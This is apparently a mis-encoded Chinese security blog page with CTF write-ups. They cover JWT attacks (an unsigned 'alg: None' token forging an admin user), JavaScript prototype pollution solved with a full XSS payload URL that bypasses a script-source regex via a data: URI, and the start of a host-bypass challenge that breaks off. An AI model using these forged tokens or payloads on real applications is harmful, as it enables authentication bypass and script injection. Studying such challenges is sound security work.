<h3 id="headeréƒ¨åˆ†"><a href="#headeréƒ¨åˆ†" class="headerlink" title="headeréƒ¨åˆ†"></a>headeréƒ¨åˆ†</h3><p>headeréƒ¨åˆ†æœ€å¸¸ç”¨çš„ä¸¤ä¸ªå­—æ®µæ˜¯<code>alg</code>å’Œ<code>typ</code>ï¼Œ<code>alg</code>æŒ‡å®šäº†tokenåŠ å¯†ä½¿ç”¨çš„ç®—æ³•ï¼ˆæœ€å¸¸ç”¨çš„ä¸º<em>HMAC</em>å’Œ<em>RSA</em>ç®—æ³•ï¼‰ï¼Œtyp`å£°æ˜ç±»å‹ä¸ºJWT</p>
<p>headeré€šå¸¸ä¼šé•¿è¿™ä¸ªæ ·å­ï¼š</p>
<pre><code>{
        &quot;alg&quot; : &quot;HS256&quot;,
        &quot;typ&quot; : &quot;jwt&quot;
}</code></pre><h3 id="payloadéƒ¨åˆ†"><a href="#payloadéƒ¨åˆ†" class="headerlink" title="payloadéƒ¨åˆ†"></a>payloadéƒ¨åˆ†</h3><p>payloadåˆ™ä¸ºç”¨æˆ·æ•°æ®ä»¥åŠä¸€äº›å…ƒæ•°æ®æœ‰å…³çš„å£°æ˜ï¼Œç”¨ä»¥å£°æ˜æƒé™ï¼Œä¸¾ä¸ªä¾‹å­ï¼Œä¸€æ¬¡ç™»å½•çš„è¿‡ç¨‹å¯èƒ½ä¼šä¼ é€’ä»¥ä¸‹æ•°æ®</p>
<pre><code>{
        &quot;user_role&quot; : &quot;finn&quot;,    //å½“å‰ç™»å½•ç”¨æˆ·
    &quot;iss&quot;: &quot;admin&quot;,          //è¯¥JWTçš„ç­¾å‘è€…
    &quot;iat&quot;: 1573440582,        //ç­¾å‘æ—¶é—´
    &quot;exp&quot;: 1573940267,        //è¿‡æœŸæ—¶é—´
    &quot;nbf&quot;: 1573440582,         //è¯¥æ—¶é—´ä¹‹å‰ä¸æ¥æ”¶å¤„ç†è¯¥Token
    &quot;domain&quot;: &quot;example.com&quot;,   //é¢å‘çš„ç”¨æˆ·
    &quot;jti&quot;: &quot;dff4214121e83057655e10bd9751d657&quot;   //Tokenå”¯ä¸€æ ‡è¯†
}</code></pre><h3 id="signatureéƒ¨åˆ†"><a href="#signatureéƒ¨åˆ†" class="headerlink" title="signatureéƒ¨åˆ†"></a>signatureéƒ¨åˆ†</h3><p>signatureçš„åŠŸèƒ½æ˜¯ä¿æŠ¤tokenå®Œæ•´æ€§ã€‚</p>
<p>ç”Ÿæˆæ–¹æ³•ä¸ºå°†headerå’Œpayloadä¸¤ä¸ªéƒ¨åˆ†è”ç»“èµ·æ¥ï¼Œç„¶åé€šè¿‡headeréƒ¨åˆ†æŒ‡å®šçš„ç®—æ³•ï¼Œè®¡ç®—å‡ºç­¾åã€‚</p>
<p>æŠ½è±¡æˆå…¬å¼å°±æ˜¯</p>
<pre><code>signature = HMAC-SHA256(base64urlEncode(header) + &#39;.&#39; + base64urlEncode(payload), secret_key)</code></pre><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œç¼–ç headerå’Œpayloadæ—¶ä½¿ç”¨çš„ç¼–ç æ–¹å¼ä¸º<code>base64urlencode</code>ï¼Œ<code>base64url</code>ç¼–ç æ˜¯<code>base64</code>çš„ä¿®æ”¹ç‰ˆï¼Œä¸ºäº†æ–¹ä¾¿åœ¨ç½‘ç»œä¸­ä¼ è¾“ä½¿ç”¨äº†ä¸åŒçš„ç¼–ç è¡¨ï¼Œå®ƒä¸ä¼šåœ¨æœ«å°¾å¡«å……â€=â€å·ï¼Œå¹¶å°†æ ‡å‡†Base64ä¸­çš„â€+â€å’Œâ€/â€œåˆ†åˆ«æ”¹æˆäº†â€-â€œå’Œâ€-â€œã€‚</p>
<h3 id="å®Œæ•´tokenç”Ÿæˆ"><a href="#å®Œæ•´tokenç”Ÿæˆ" class="headerlink" title="å®Œæ•´tokenç”Ÿæˆ"></a>å®Œæ•´tokenç”Ÿæˆ</h3><p>ä¸€ä¸ªå®Œæ•´çš„jwtæ ¼å¼ä¸º(<code>header</code>.<code>payload</code>.<code>signature</code>)ï¼Œå…¶ä¸­headerã€payloadä½¿ç”¨base64urlç¼–ç ï¼Œsignatureé€šè¿‡æŒ‡å®šç®—æ³•ç”Ÿæˆã€‚</p>
<p>pythonçš„<code>Pyjwt</code>ä½¿ç”¨ç¤ºä¾‹å¦‚ä¸‹</p>
<pre><code>import jwt

encoded_jwt = jwt.encode({&#39;user_name&#39;: &#39;admin&#39;}, &#39;key&#39;, algorithm=&#39;HS256&#39;)
print(encoded_jwt)
print(jwt.decode(encoded_jwt, &#39;key&#39;, algorithms=[&#39;HS256&#39;]))</code></pre><p>ç”Ÿæˆçš„tokenä¸º</p>
<pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9`.`eyJ1c2VyX25hbWUiOiJhZG1pbiJ9.oL5szC7mFoJ_7FI9UVMcKfmisqr6Qlo1dusps5wOUlo</code></pre><h2 id="æ”»å‡»æ–¹å¼"><a href="#æ”»å‡»æ–¹å¼" class="headerlink" title="æ”»å‡»æ–¹å¼"></a>æ”»å‡»æ–¹å¼</h2><h3 id="åŠ å¯†ç®—æ³•"><a href="#åŠ å¯†ç®—æ³•" class="headerlink" title="åŠ å¯†ç®—æ³•"></a>åŠ å¯†ç®—æ³•</h3><h4 id="ç©ºåŠ å¯†ç®—æ³•"><a href="#ç©ºåŠ å¯†ç®—æ³•" class="headerlink" title="ç©ºåŠ å¯†ç®—æ³•"></a>ç©ºåŠ å¯†ç®—æ³•</h4><p>JWTæ”¯æŒä½¿ç”¨ç©ºåŠ å¯†ç®—æ³•ï¼Œå¯ä»¥åœ¨headerä¸­æŒ‡å®šalgä¸º<code>None</code></p>
<p>è¿™æ ·çš„è¯ï¼Œåªè¦æŠŠsignatureè®¾ç½®ä¸ºç©ºï¼ˆå³ä¸æ·»åŠ signatureå­—æ®µï¼‰ï¼Œæäº¤åˆ°æœåŠ¡å™¨ï¼Œä»»ä½•tokenéƒ½å¯ä»¥é€šè¿‡æœåŠ¡å™¨çš„éªŒè¯ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œä½¿ç”¨ä»¥ä¸‹çš„å­—æ®µ</p>
<pre><code>{
    &quot;alg&quot; : &quot;None&quot;,
    &quot;typ&quot; : &quot;jwt&quot;
}

{
    &quot;user&quot; : &quot;Admin&quot;
}</code></pre><p>ç”Ÿæˆçš„å®Œæ•´tokenä¸º<code>ew0KCSJhbGciIDogIk5vbmUiLA0KCSJ0eXAiIDogImp3dCINCn0.ew0KCSJ1c2VyIiA6ICJBZG1pbiINCn0</code></p>
<p>(header+â€™.â€™+payloadï¼Œå»æ‰äº†â€™.â€™+signatureå­—æ®µ)</p>
<p>ç©ºåŠ å¯†ç®—æ³•çš„è®¾è®¡åˆè¡·æ˜¯ç”¨äºè°ƒè¯•çš„ï¼Œä½†æ˜¯å¦‚æœæŸå¤©å¼€å‘äººå‘˜è„‘é˜”ç“¦ç‰¹äº†ï¼Œåœ¨ç”Ÿäº§ç¯å¢ƒä¸­å¼€å¯äº†ç©ºåŠ å¯†ç®—æ³•ï¼Œç¼ºå°‘ç­¾åç®—æ³•ï¼Œjwtä¿è¯ä¿¡æ¯ä¸è¢«ç¯¡æ”¹çš„åŠŸèƒ½å°±å¤±æ•ˆäº†ã€‚æ”»å‡»è€…åªéœ€è¦æŠŠalgå­—æ®µè®¾ç½®ä¸ºNoneï¼Œå°±å¯ä»¥åœ¨payloadä¸­æ„é€ èº«ä»½ä¿¡æ¯ï¼Œä¼ªé€ ç”¨æˆ·èº«ä»½ã€‚</p>
<h4 id="ä¿®æ”¹RSAåŠ å¯†ç®—æ³•ä¸ºHMAC"><a href="#ä¿®æ”¹RSAåŠ å¯†ç®—æ³•ä¸ºHMAC" class="headerlink" title="ä¿®æ”¹RSAåŠ å¯†ç®—æ³•ä¸ºHMAC"></a>ä¿®æ”¹RSAåŠ å¯†ç®—æ³•ä¸ºHMAC</h4><h3 id="çˆ†ç ´"><a href="#çˆ†ç ´" class="headerlink" title="çˆ†ç ´"></a>çˆ†ç ´</h3><p>å·¥å…· <a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">c-jwt-cracker</a> </p>
<p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="https://www.ccreater.top/1970/01/01/jwtæ”»å‡»æ–¹å¼/">https://www.ccreater.top/1970/01/01/jwtæ”»å‡»æ–¹å¼/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/jwt%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/" data-id="ckmn57576005zs1ni9jaff449" data-title="jwtæ”»å‡»æ–¹å¼" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-jsåŸå‹é“¾æ±¡æŸ“" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">jsåŸå‹é“¾æ±¡æŸ“</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="jsåŸå‹é“¾æ±¡æŸ“"><a href="#jsåŸå‹é“¾æ±¡æŸ“" class="headerlink" title="jsåŸå‹é“¾æ±¡æŸ“"></a>jsåŸå‹é“¾æ±¡æŸ“</h1><p> <a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html</a> </p>
<h2 id="ä»€ä¹ˆæ˜¯åŸå‹é“¾"><a href="#ä»€ä¹ˆæ˜¯åŸå‹é“¾" class="headerlink" title="ä»€ä¹ˆæ˜¯åŸå‹é“¾"></a>ä»€ä¹ˆæ˜¯åŸå‹é“¾</h2><p> æ¯ä¸ªå®ä¾‹å¯¹è±¡ï¼ˆ object ï¼‰éƒ½æœ‰ä¸€ä¸ªç§æœ‰å±æ€§ï¼ˆç§°ä¹‹ä¸º <strong>proto</strong> ï¼‰æŒ‡å‘å®ƒçš„æ„é€ å‡½æ•°çš„åŸå‹å¯¹è±¡ï¼ˆ<strong>prototype</strong> ï¼‰ã€‚è¯¥åŸå‹å¯¹è±¡ä¹Ÿæœ‰ä¸€ä¸ªè‡ªå·±çš„åŸå‹å¯¹è±¡( <strong>proto</strong> ) ï¼Œå±‚å±‚å‘ä¸Šç›´åˆ°ä¸€ä¸ªå¯¹è±¡çš„åŸå‹å¯¹è±¡ä¸º <code>null</code>ã€‚æ ¹æ®å®šä¹‰ï¼Œ<code>null</code> æ²¡æœ‰åŸå‹ï¼Œå¹¶ä½œä¸ºè¿™ä¸ª<strong>åŸå‹é“¾</strong>ä¸­çš„æœ€åä¸€ä¸ªç¯èŠ‚ã€‚ </p>
<pre><code class="javascript">function Foo
{

    this.a=&quot;456&quot;;
    this.c=&quot;777&quot;
}
Foo.prototype.b=&quot;123&quot;;
Foo.prototype.c=&quot;789&quot;;
var foo=new Foo();
console.log(foo.a);//456    
console.log(foo.b);//123
console.log(foo.c);//777</code></pre>
<p>å½“åœ¨å½“å‰å¯¹è±¡æ‰¾ä¸åˆ°å±æ€§æˆ–æ–¹æ³•æ—¶ä¾¿ä¼šå‘ä¸Š(<code>__proto__</code>ä¸­)å¯»æ‰¾</p>
<ol>
<li>åœ¨å¯¹è±¡fooä¸­å¯»æ‰¾b</li>
<li>å¦‚æœæ‰¾ä¸åˆ°ï¼Œåˆ™åœ¨<code>foo.__proto__</code>ä¸­å¯»æ‰¾b</li>
<li>å¦‚æœä»ç„¶æ‰¾ä¸åˆ°ï¼Œåˆ™ç»§ç»­åœ¨<code>foo.__proto__.__proto__</code>ä¸­å¯»æ‰¾b</li>
<li>ä¾æ¬¡å¯»æ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°<code>null</code>ç»“æŸã€‚æ¯”å¦‚ï¼Œ<code>Object.prototype</code>çš„<code>__proto__</code>å°±æ˜¯<code>null</code></li>
</ol>
<p>JavaScriptçš„è¿™ä¸ªæŸ¥æ‰¾çš„æœºåˆ¶ï¼Œè¢«è¿ç”¨åœ¨é¢å‘å¯¹è±¡çš„ç»§æ‰¿ä¸­ï¼Œè¢«ç§°ä½œprototypeç»§æ‰¿é“¾ã€‚</p>
<p>ä»¥ä¸Šå°±æ˜¯æœ€åŸºç¡€çš„JavaScripté¢å‘å¯¹è±¡ç¼–ç¨‹ï¼Œæˆ‘ä»¬å¹¶ä¸æ·±å…¥ç ”ç©¶æ›´ç»†èŠ‚çš„å†…å®¹ï¼Œåªè¦ç‰¢è®°ä»¥ä¸‹å‡ ç‚¹å³å¯ï¼š</p>
<ol>
<li>æ¯ä¸ªæ„é€ å‡½æ•°(constructor)éƒ½æœ‰ä¸€ä¸ªåŸå‹å¯¹è±¡(prototype)</li>
<li>å¯¹è±¡çš„<code>__proto__</code>å±æ€§ï¼ŒæŒ‡å‘ç±»çš„åŸå‹å¯¹è±¡<code>prototype</code></li>
<li>JavaScriptä½¿ç”¨prototypeé“¾å®ç°ç»§æ‰¿æœºåˆ¶</li>
</ol>
<h2 id="ä»€ä¹ˆæ—¶åŸå‹é“¾æ±¡æŸ“"><a href="#ä»€ä¹ˆæ—¶åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="ä»€ä¹ˆæ—¶åŸå‹é“¾æ±¡æŸ“"></a>ä»€ä¹ˆæ—¶åŸå‹é“¾æ±¡æŸ“</h2><p>å½“æˆ‘ä»¬ä¿®æ”¹å¯¹è±¡çš„<code>__proto__</code>å±æ€§æ—¶,å°±ç›¸å½“äºä¿®æ”¹å¯¹è±¡çš„çˆ¶ç±»</p>
<p>å½“è°ƒç”¨ä¸å­˜åœ¨çš„æ–¹æ³•æˆ–å±æ€§æ—¶ä¾¿ä¼šåœ¨çˆ¶ç±»ä¸­å¯»æ‰¾,å°±å˜ç›¸çš„æ§åˆ¶äº†è¿™ä¸ªç±»</p>
<pre><code class="javascript">let foo = {bar: 1}

// foo.bar æ­¤æ—¶ä¸º1
console.log(foo.bar)

// ä¿®æ”¹fooçš„åŸå‹ï¼ˆå³Objectï¼‰
foo.__proto__.bar = 2

// ç”±äºæŸ¥æ‰¾é¡ºåºçš„åŸå› ï¼Œfoo.barä»ç„¶æ˜¯1
console.log(foo.bar)

// æ­¤æ—¶å†ç”¨Objectåˆ›å»ºä¸€ä¸ªç©ºçš„zooå¯¹è±¡
let zoo = {}

// æŸ¥çœ‹zoo.bar
console.log(zoo.bar)</code></pre>
<h2 id="å“ªäº›æƒ…å†µåŸå‹é“¾ä¼šè¢«æ±¡æŸ“"><a href="#å“ªäº›æƒ…å†µåŸå‹é“¾ä¼šè¢«æ±¡æŸ“" class="headerlink" title="å“ªäº›æƒ…å†µåŸå‹é“¾ä¼šè¢«æ±¡æŸ“"></a>å“ªäº›æƒ…å†µåŸå‹é“¾ä¼šè¢«æ±¡æŸ“</h2><h3 id="merge"><a href="#merge" class="headerlink" title="merge"></a>merge</h3><h3 id="clone"><a href="#clone" class="headerlink" title="clone"></a>clone</h3><h3 id="JSON-parse"><a href="#JSON-parse" class="headerlink" title="JSON.parse"></a>JSON.parse</h3><h3 id="jQuery-extend"><a href="#jQuery-extend" class="headerlink" title="jQuery.extend"></a>jQuery.extend</h3><p><em>$</em>.extend( target [, object1 ] [, objectN ] )</p>
<p>æŒ‡ç¤ºæ˜¯å¦æ·±åº¦åˆå¹¶</p>
<p><em>$</em>.extend( [deep ], target, object1 [, objectN ] )</p>
<p><strong>è­¦å‘Š:</strong> ä¸æ”¯æŒç¬¬ä¸€ä¸ªå‚æ•°ä¼ é€’ false ã€‚</p>
<table>
<thead>
<tr>
<th align="left">å‚æ•°</th>
<th align="left">æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><em>deep</em></td>
<td align="left">å¯é€‰ã€‚ Booleanç±»å‹ æŒ‡ç¤ºæ˜¯å¦æ·±åº¦åˆå¹¶å¯¹è±¡ï¼Œé»˜è®¤ä¸ºfalseã€‚å¦‚æœè¯¥å€¼ä¸ºtrueï¼Œä¸”å¤šä¸ªå¯¹è±¡çš„æŸä¸ªåŒåå±æ€§ä¹Ÿéƒ½æ˜¯å¯¹è±¡ï¼Œåˆ™è¯¥â€å±æ€§å¯¹è±¡â€çš„å±æ€§ä¹Ÿå°†è¿›è¡Œåˆå¹¶ã€‚</td>
</tr>
<tr>
<td align="left"><em>target</em></td>
<td align="left">Objectç±»å‹ ç›®æ ‡å¯¹è±¡ï¼Œå…¶ä»–å¯¹è±¡çš„æˆå‘˜å±æ€§å°†è¢«é™„åŠ åˆ°è¯¥å¯¹è±¡ä¸Šã€‚</td>
</tr>
<tr>
<td align="left"><em>object1</em></td>
<td align="left">å¯é€‰ã€‚ Objectç±»å‹ ç¬¬ä¸€ä¸ªè¢«åˆå¹¶çš„å¯¹è±¡ã€‚</td>
</tr>
<tr>
<td align="left"><em>objectN</em></td>
<td align="left">å¯é€‰ã€‚ Objectç±»å‹ ç¬¬Nä¸ªè¢«åˆå¹¶çš„å¯¹è±¡ã€‚</td>
</tr>
</tbody></table>
<h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><p>é¢˜ç›®ä»£ç </p>
<p>car.class.js</p>
<pre><code class="javascript">class Car {
    constructor(type, model, color, pic, key=&quot;&quot;) {
        this.type = type
        this.model = model
        this.color = color
        this.key = key
        this.pic = pic

        let started = false
        this.start = () =&gt; {
            started = true
        }
        this.isStarted = () =&gt; {
            return started
        }
    }
    powerOn() {
        if (this.isStarted()) {
            infobox(`Well Done!`)
            nextCar()

        } else {
            $(&#39;.chargeup&#39;)[0].play()
        }
    }
    info() {
        infobox(`This car is a ${this.type} ${this.model} in ${this.color}. It looks very nice! But it seems to be broken ...`)
    }
    repair() {
        if(urlParams.has(&#39;repair&#39;)) {
            $.extend(true, this, JSON.parse(urlParams.get(&#39;repair&#39;)))
        }
    }
    light() {
        infobox(`You turn on the lights ... Nothing happens.`)
    }
    battery() {
        infobox(`Hmmm, the battery is almost empty ... Maybe i can repair this somehow.`)
    }
    ignition() {
        if (this.key == &quot;&quot;) {
            infobox(`Looks like the key got lost. No wonder the car is not starting ...`)
        }
        if (this.key == &quot;ğŸ”‘&quot;) {
            infobox(`The car started!`)
            this.start()
        }
    }
}</code></pre>
<p>util.js</p>
<pre><code class="javascript">const urlParams = new URLSearchParams(window.location.search)
const h = location.hash.slice(1)
const bugatti = new Car(&#39;Bugatti&#39;, &#39;T35&#39;, &#39;green&#39;, &#39;assets/images/bugatti.png&#39;)
const porsche = new Car(&#39;Porsche&#39;, &#39;911&#39;, &#39;yellow&#39;, &#39;assets/images/porsche.png&#39;)

const cars = [bugatti, porsche]

porsche.repair = () =&gt; {
    if(!bugatti.isStarted()){
        infobox(`Not so fast. Repair the other car first!`)
    }
    else if($.md5(porsche) == &#39;9cdfb439c7876e703e307864c9167a15&#39;){
        if(urlParams.has(&#39;help&#39;)) {
            repairWithHelper(urlParams.get(&#39;help&#39;))
        }
    }
    else{
        infobox(`Repairing this is not that easy.`)
    }
}
porsche.ignition = () =&gt; {
    infobox(`Hmm ... WTF!`)
}

$(document).ready(() =&gt; {
    const [car] = cars
    $(&#39;.fa-power-off&#39;).click(() =&gt; car.powerOn())
    $(&#39;.fa-car&#39;).click(() =&gt; car.info())
    $(&#39;.fa-lightbulb-o&#39;).click(() =&gt; car.light())
    $(&#39;.fa-battery-quarter&#39;).click(() =&gt; car.battery())
    $(&#39;.fa-key&#39;).click(() =&gt; car.ignition())
    $(&#39;.fa-wrench&#39;).click(() =&gt; car.repair())

    $(&#39;.fa-step-forward&#39;).click(() =&gt; nextCar())

    if(h.includes(&#39;Bugatti&#39;))
        autoStart(bugatti)
    if(h.includes(&#39;Porsche&#39;))
        autoStart(porsche)
})


const nextCar = () =&gt; {
    cars.push(cars.shift())
    $(&quot;.image&quot;).attr(&#39;src&#39;, cars[0].pic);
}


const autoStart = (car) =&gt; {
    car.repair()
    car.ignition()
    car.powerOn()
}


const repairWithHelper = (src) =&gt; {
    /* who needs csp anyways !? */
    urlRegx = /^\w{4,5}:\/\/car-repair-shop\.fluxfingersforfuture\.fluxfingers\.net\/[\w\d]+\/.+\.js$/;
    if (urlRegx.test(src)) {
        let s = document.createElement(&#39;script&#39;)
        s.src = src
        $(&#39;head&#39;).append(s)
    }
}


const infobox = (text) =&gt; {
    $(&#39;a&#39;).css({&#39;pointer-events&#39;: &#39;none&#39;, &#39;border&#39;: &#39;none&#39;})
    $(&#39;.infobox&#39;).addClass(&#39;infoAnimate&#39;)
        .text(text)
        .on(&#39;animationend&#39;, function() {
            $(this).removeClass(&#39;infoAnimate&#39;)
            $(&#39;a&#39;).css({&#39;pointer-events&#39;: &#39;all&#39;, &#39;border&#39;: &#39;solid 1px rgba(255, 255, 255, .25)&#39;})
    })

}</code></pre>
<p>é˜…è¯»ä»£ç å‘ç°carç±»çš„repairæ–¹æ³•ä¼šè°ƒç”¨</p>
<p><code>$.extend(true, this, JSON.parse(urlParams.get(&#39;repair&#39;)))</code></p>
<p>å¯ä»¥è¿›è¡ŒåŸå‹é“¾æ±¡æŸ“</p>
<p>è€Œè¿™ä¸€é¢˜æˆ‘ä»¬çš„ç›®æ ‡æ—¶è¿›è¡Œxss</p>
<p>é˜…è¯»ä»£ç å‘ç°å¯¹è±¡<code>porsche</code>çš„repairWithHelperä¸­å¯ä»¥è¿›è¡Œxss</p>
<p>è€Œè°ƒç”¨repairWithHelperæ–¹æ³•å°±éœ€è¦è°ƒç”¨porscheçš„repairæ–¹æ³•</p>
<pre><code>if($.md5(porsche) == &#39;9cdfb439c7876e703e307864c9167a15&#39;){
        if(urlParams.has(&#39;help&#39;)) {
            repairWithHelper(urlParams.get(&#39;help&#39;))
        }
}</code></pre><p>æˆ‘ä»¬ç”¨æ§åˆ¶porsche.toString()==â€™lolâ€™(lolçš„md5æ˜¯9cdfb439c7876e703e307864c9167a15)ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åŸå‹é“¾æ±¡æŸ“æ¥è®©ä¸Šå±‚ä¸º<code>[&#39;lol&#39;]</code>([â€˜lolâ€™].toString()==â€™lolâ€™)</p>
<p>é€šè¿‡autoStartæ¥è°ƒç”¨bugatti.repair(åŸå‹é“¾æ±¡æŸ“)å’Œporsche.repair(è°ƒç”¨repairWithHelperæ–¹æ³•)</p>
<p>æ‰€ä»¥æ„é€ payload:<code>http://127.0.0.1/?repair={&quot;started&quot;:true,&quot;__proto__&quot;:{&quot;__proto__&quot;:[&quot;lol&quot;]}}</code></p>
<p>æ¥ä¸‹æ¥å°±æ˜¯åˆ©ç”¨repairWithHelperæ¥è¿›è¡Œxss</p>
<pre><code class="javascript">const repairWithHelper = (src) =&gt; {
    /* who needs csp anyways !? */
    urlRegx = /^\w{4,5}:\/\/car-repair-shop\.fluxfingersforfuture\.fluxfingers\.net\/[\w\d]+\/.+\.js$/;
    if (urlRegx.test(src)) {
        let s = document.createElement(&#39;script&#39;)
        s.src = src
        $(&#39;head&#39;).append(s)
    }
}</code></pre>
<p>è™½ç„¶è¿™é‡Œå¯¹urlçš„åŸŸåè¿›è¡Œäº†é™åˆ¶ä¸èƒ½è¿œç¨‹æ–‡ä»¶åŒ…å«</p>
<p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨dataåè®®æ¥ç»•è¿‡æ­£åˆ™ä»è€Œç›´æ¥æ‰§è¡Œå‘½ä»¤</p>
<p>dataåè®®æ ¼å¼</p>
<pre><code>data:[&lt;mime type&gt;][;charset=&lt;charset&gt;][;base64],&lt;encoded data&gt;</code></pre><p>æœ€åçš„payload:<code>http://127.0.0.1/?repair={&quot;key&quot;:&quot;ğŸ”‘&quot;,&quot;__proto__&quot;:{&quot;__proto__&quot;:[&quot;lol&quot;]}}&amp;help=data://car-repair-shop.fluxfingersforfuture.fluxfingers.net/asdfsdf/asdf,alert(&quot;123&quot;)%23.js#BugattiPorsche</code></p>
<p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="https://www.ccreater.top/1970/01/01/jsåŸå‹é“¾æ±¡æŸ“/">https://www.ccreater.top/1970/01/01/jsåŸå‹é“¾æ±¡æŸ“/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" data-id="ckmn575770063s1nie31t6qlo" data-title="jsåŸå‹é“¾æ±¡æŸ“" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-nbctf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/nbctf/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">æ¯”èµ›</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/nbctf/">newbie ctf 2019</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="newbie-ctf-2019"><a href="#newbie-ctf-2019" class="headerlink" title="newbie ctf 2019"></a>newbie ctf 2019</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="normal-host"><a href="#normal-host" class="headerlink" title="normal_host"></a>normal_host</h3><p>é¢˜ç›®æè¿°:</p>
<blockquote>
<p>You can get flag in â€œnormalflag.iwinv.netâ€</p>
</blockquote>
<p>é¢˜ç›®ç»™çš„é“¾æ¥</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kogjizorj30ue0gvngf.jpg" alt="image.png"></p>
<p>ç›´æ¥è®¿é—® flag</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kofgp0d7j312909paar.jpg" alt="image.png"></p>
<p>è¾“å…¥ç½‘ç«™æµ‹è¯•å‘ç°,ä¼šåœ¨ç½‘å€åé¢åŠ ä¸ªsecretå‚æ•°</p>
<p><img src="C:%5CUsers%5C%E8%94%A1%E5%BB%BA%E6%96%8C%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191103111420354.png" alt="image-20191103111420354"></p>
<p>è€Œflagç•Œé¢å°±æ˜¯é€šè¿‡è¿™ä¸ªsecretæ¥è¯†åˆ«æ˜¯å¦é€šè¿‡internal.iwinv.net</p>
<p>è§‚å¯Ÿsecretå‘ç°ï¼Œæ¯æ¬¡è®¿é—®ç»™å‡ºçš„secretéƒ½ä¸ä¸€æ ·</p>
<p>æ’é™¤æ‰ç®—å‡ºsecretçš„åšæ³•,é‚£ä¹ˆæ¥ä¸‹æ¥å°±æ˜¯è¦ç»•è¿‡ç¦ç”¨hostçš„é™åˆ¶æˆ–è€…æ˜¯è¾“å…¥ä¸€ä¸ªç½‘å€ï¼Œè®©å…¶æ— æ³•è¯†åˆ«å‡ºæ˜¯<code>normalflag.iwinv.net</code>å´èƒ½è®¿é—®<code>normalflag.iwinv.net</code></p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kolppcsfj30g3045748.jpg" alt="image.png"></p>
<p>è¿™å°±å¾ˆå®¹æ˜“æƒ³åˆ°phpé‡Œé¢libcurlå’Œparaseçš„å·®å¼‚</p>
<blockquote>
